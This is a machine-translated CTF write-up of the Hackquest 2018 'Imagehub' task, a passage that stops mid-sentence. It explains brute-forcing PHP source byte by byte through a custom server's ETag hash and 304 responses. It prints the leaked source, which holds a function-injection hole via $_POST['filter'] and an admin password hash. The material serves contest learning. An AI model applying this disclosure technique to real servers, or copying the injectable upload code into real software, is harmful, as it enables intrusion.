<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üè¥ ‚õ¥Ô∏è üõÄ Hackquest 2018. Hasil & Tulisan. Hari 4-7 ü§ó üë©üèª‚Äçüöí üë®üèΩ‚Äçüíª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Seperti yang dijanjikan, kami memposting bagian kedua dari keputusan retas tahunan. Hari 4-7: ketegangan meningkat, dan tugas lebih menarik! 


 Konte...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hackquest 2018. Hasil & Tulisan. Hari 4-7</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/440312/">  Seperti yang dijanjikan, kami memposting bagian kedua dari keputusan retas tahunan.  Hari 4-7: ketegangan meningkat, dan tugas lebih menarik! <br><img src="https://habrastorage.org/webt/oa/br/8l/oabr8lkxzurvxgw-20o0jq23hgo.jpeg"><br><a name="habracut"></a><br><h2>  Konten: </h2><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Hari4.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Imagehub</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Day5.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Waktu</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Hari6.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Vm yang luar biasa</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Hari ke 7.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Sumberdaya tersembunyi</a> </li></ul><br><img src="https://habrastorage.org/webt/xv/67/n9/xv67n9j_kw2fxrljp9zrrqewzxk.jpeg"><br><h2><a name="Imagehub"></a>  Hari4.  Imagehub </h2><br>  Tugas ini disiapkan oleh <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">SPbCTF</a> . <br><br>  <i>Kreasi baru kami akan membunuh Instagram.</i>  <i>Kami akan meyakinkan Anda hanya dengan dua kata:</i> <i><br><br></i>  <i>1. Filter.</i>  <i>Filter baru yang belum pernah dilihat sebelumnya untuk gambar yang Anda unggah.</i> <i><br></i>  <i>2. Caching.</i>  <i>Server HTTP kustom memastikan file gambar mendarat di cache browser.</i> <i><br><br></i>  <i>Coba sekarang juga!</i>  <i>imagehub.spb.ctf.su</i> <i><br><br></i>  <i>Jalankan / get_the_flag untuk menang.</i> <i><br></i>  <i>Biner server khusus: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">dppth</a></i> <br><br>  <b>Petunjuk</b> <br>  <i><b>10/25/2018 20:00</b></i> <i><br></i>  <i>Tugas tidak terpecahkan.</i>  <i>24 jam ditambahkan.</i> <i><br><br></i>  <i><b>10/25/2018 17:00</b></i> <i><br></i>  <i>Ada dua bug yang kita ketahui.</i>  <i>Yang pertama memberi Anda sumber aplikasi web, yang kedua memberi Anda RCE.</i> <br><br><h4>  Ikhtisar: </h4><br>  Dapat dieksekusi: <br><br><ul><li>  ELF x86_64 </li><li>  Menerapkan server http sederhana </li><li>  Jika file yang diminta memiliki bit yang dapat dieksekusi, kemudian diteruskan ke php-fpm </li><li>  Kode mengimplementasikan caching etag kustom </li></ul><br>  Komponen web: <br><br><ul><li>  Memiliki fungsi unggah file.  Gambar dapat dimodifikasi menggunakan filter standar. </li><li>  Halaman Admin dengan Dasar pada /? Admin = tampilkan </li></ul><br><h4>  Kerentanan: Membaca kode sumber </h4><br>  Fungsionalitas cache sepertinya menarik, karena kita bisa mendapatkan server untuk meng-hash rentang file yang acak (bahkan rentang 1 byte). <br><br> <code>Etag = sprintf("%08x%08x%08x", file_mtime, hash, file_size);</code> <br> <div class="spoiler">  <b class="spoiler_title">Hash_fungsi:</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">etag_hash</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data)</span></span></span><span class="hljs-function">:</span></span> v16 = [<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _ <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">16</span></span>)] v16[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span> v16[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0x1DB71064</span></span> v16[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0x3B6E20C8</span></span> v16[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0x26D930AC</span></span> v16[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0x76DC4190</span></span> v16[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0x6B6B51F4</span></span> v16[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0x4DB26158</span></span> v16[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0x5005713C</span></span> v16[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0xEDB88320</span></span> v16[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0xF00F9344</span></span> v16[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0xD6D6A3E8</span></span> v16[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0xCB61B38C</span></span> v16[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0x9B64C2B0</span></span> v16[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0x86D3D2D4</span></span> v16[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0xA00AE278</span></span> v16[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0xBDBDF21C</span></span> hash = <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(data)): v5 = ((hash &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[(hash ^ data[i]) &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span>]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> hash = ((v5 &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[v5 &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span> ^ (data[i] &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>)]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (~hash) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span></code> </pre> <br></div></div><br>  Sayangnya etag dilucuti untuk file yang dapat dieksekusi (* .php): <br><br><pre> <code class="plaintext hljs">stat_0(v2, &amp;stat_buf); if ( stat_buf.st_mode &amp; S_IEXEC ) { setHeader(a2-&gt;respo, "cache-control", "no-store"); deleteHeade(a2-&gt;respo, "etag"); set_environment_info(a1); dup2(fd, 0); snprintf(s, 4096, "/usr/bin/php-cgi %s", a1-&gt;url);</code> </pre> <br>  Masih ada pemeriksaan sebelum eksekusi halaman, jadi jika kita menebak dengan benar nilai etag ( <b>jika-tidak ada yang cocok</b> ), maka server akan memberikan respons status <b>304 Tidak Diubah</b> .  Dengan menggunakan ini kita dapat bruteforce kode sumber byte demi byte. <br><br><pre> <code class="plaintext hljs">v11 = getHeader(&amp;s.request, "if-modified-since"); if ( v11 ) { v3 = getHeader(&amp;v14, "last-modified"); if ( !strcmp(v11, v3) ) send_status(304); } v12 = getHeader(&amp;s.request, "if-none-match"); if ( v12 ) { v4 = getHeader(&amp;v14, "etag"); if ( !strcmp(v12, v4) ) send_status(304); } exec_and_prepare_response_body(&amp;s, &amp;a2a);</code> </pre> <br>  Mari kita simpulkan apa yang kita dapatkan dari RE: <br><br><ol><li>  Stempel waktu mudah dibaca dari header respons yang dimodifikasi terakhir (string -&gt; stempel waktu). </li><li>  Rentang memungkinkan panjang satu byte (jadi kami akan mendapatkan hash hanya satu byte) </li><li>  Hash dapat ditebak untuk rentang 1 byte (256 nilai yang mungkin) </li><li>  Ukurannya bruteforceable, tetapi kita perlu tahu setidaknya satu byte dari file target. </li><li>  Karena kami ingin mendapatkan sumber untuk file * .php, asumsi yang bagus, bahwa file tersebut dimulai dengan "&lt;? Php". </li></ol><br>  Langkah pertama akan mendapatkan ukuran, dan yang kedua adalah mendapatkan konten file yang sebenarnya. <br>  Dengan kode multi-ulir, saya mencapai kecepatan ~ 1 karakter / detik, dan membuang beberapa file: <br><div class="spoiler">  <b class="spoiler_title">index.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">// error_reporting(0); if (isset($_GET["admin"]) &amp;&amp; (!isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW'] !== '888b2f04eef9a49fc87fa81089b736de')) { header('WWW-Authenticate: Basic realm="Admin Area"'); header('HTTP/1.0 401 Unauthorized'); } require "upload.php"; $uploader = new ImageUploader(); $result = $uploader-&gt;upload(); if ($result === true) die(); if ($result &gt; 0) { echo "Error: " . $result; } if ($uploader-&gt;upload() !== true) { include "templates/main.php"; }</span></span></code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">unggah.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/uploaderror.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/verify.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/filters.php"</span></span>; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ImageUploader</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> TARGET_DIR = <span class="hljs-string"><span class="hljs-string">"51a8ae2cab09c6b728919fe09af57ded/"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">upload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $result = verify_parameters(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($result !== <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $result; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!move_uploaded_file($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>], $target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::MOVE_ERROR; } $text = $_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]; $filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text); $imagick = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> \Imagick(realpath($target_file)); $imagick-&gt;scaleimage($size, $size); $imagick-&gt;setImageOpacity(<span class="hljs-number"><span class="hljs-number">0.5</span></span>); $imagick-&gt;compositeImage($filterImage, imagick::CHANNEL_ALPHA, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); header(<span class="hljs-string"><span class="hljs-string">"Content-Type: image/jpeg"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $imagick-&gt;getImageBlob(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } }</code> </pre> </div></div><br><div class="spoiler">  <b class="spoiler_title">termasuk / filter.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">make_text</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($image, $size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $draw = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickDraw(); $draw-&gt;setFillColor(<span class="hljs-string"><span class="hljs-string">'white'</span></span>); $draw-&gt;setFontSize( <span class="hljs-number"><span class="hljs-number">18</span></span> ); $image-&gt;annotateImage($draw, $size / <span class="hljs-number"><span class="hljs-number">2</span></span> - <span class="hljs-number"><span class="hljs-number">65</span></span>, $size - <span class="hljs-number"><span class="hljs-number">20</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, $text); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">futut</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">incasinato</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(130,100,255,3)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">fertocht</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $s = $size % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">"rgba($s,$s,$s,127)"</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">jebeno</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(0,255,255,255)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i*<span class="hljs-number"><span class="hljs-number">10</span></span>) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-($size-$j)) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">kuthamanga</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]+$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; }</code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">termasuk / uploaderror.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UploadError</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> POST_SUBMIT = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> IMAGE_NOT_FOUND = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> NOT_IMAGE = <span class="hljs-number"><span class="hljs-number">2</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> FILE_EXISTS = <span class="hljs-number"><span class="hljs-number">3</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> BIG_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_EXTENSION = <span class="hljs-number"><span class="hljs-number">5</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_MIMETYPE = <span class="hljs-number"><span class="hljs-number">6</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INVALID_PARAMS = <span class="hljs-number"><span class="hljs-number">7</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_SIZE = <span class="hljs-number"><span class="hljs-number">8</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> MOVE_ERROR = <span class="hljs-number"><span class="hljs-number">9</span></span>; }</code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">termasuk / verifikasi.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">verify_parameters</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'submit'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::POST_SUBMIT; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_FILES[<span class="hljs-string"><span class="hljs-string">'imageFile'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::IMAGE_NOT_FOUND; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $imageFileType = strtolower(pathinfo($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>], PATHINFO_EXTENSION)); $imageFileInfo = getimagesize($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($imageFileInfo === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::NOT_IMAGE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"size"</span></span>] &gt; <span class="hljs-number"><span class="hljs-number">1024</span></span>*<span class="hljs-number"><span class="hljs-number">32</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::BIG_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!in_array($imageFileType, [<span class="hljs-string"><span class="hljs-string">'jpg'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_EXTENSION; } $imageMimeType = $imageFileInfo[<span class="hljs-string"><span class="hljs-string">'mime'</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($imageMimeType !== <span class="hljs-string"><span class="hljs-string">'image/jpeg'</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_MIMETYPE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (file_exists($target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::FILE_EXISTS; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INVALID_PARAMS; } $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (($size &lt;= <span class="hljs-number"><span class="hljs-number">0</span></span>) || ($size &gt; <span class="hljs-number"><span class="hljs-number">512</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; }</code> </pre> <br></div></div><br>  Ini memberi kita: <br><ul><li>  Nama pengguna / kata sandi untuk Admin Basic.  Sama sekali tidak berguna, itu hanya mencetak string: <br>  <i>Selamat.</i>  <i>Sekarang Anda dapat membaca sumber.</i>  <i>Pergi lebih dalam.</i> </li><li>  Fungsi Injeksi (FI) pada input ' 